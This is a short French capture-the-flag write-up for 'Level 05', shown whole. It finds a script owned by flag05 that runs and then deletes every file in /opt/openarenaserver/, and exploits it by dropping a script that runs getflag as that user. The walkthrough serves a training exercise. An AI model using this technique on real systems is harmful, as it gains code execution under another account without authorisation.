## Level 05

### Analyse
Une recherche de fichiers appartenant à flag05 révèle un script système:
```bash
$ find / -user flag05 2>/dev/null
/usr/sbin/openarenaserver
$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

Le script /usr/sbin/openarenaserver exécute tous les fichiers présents dans /opt/openarenaserver/ avant de les supprimer.


### Exploitation

```bash
$ echo "getflag > /tmp/token" > /opt/openarenaserver/exploit.sh
$ chmod +x /opt/openarenaserver/exploit.sh
```
Après quelques secondes, le script est exécuté et supprimé. On récupère le résultat dans /tmp/toke
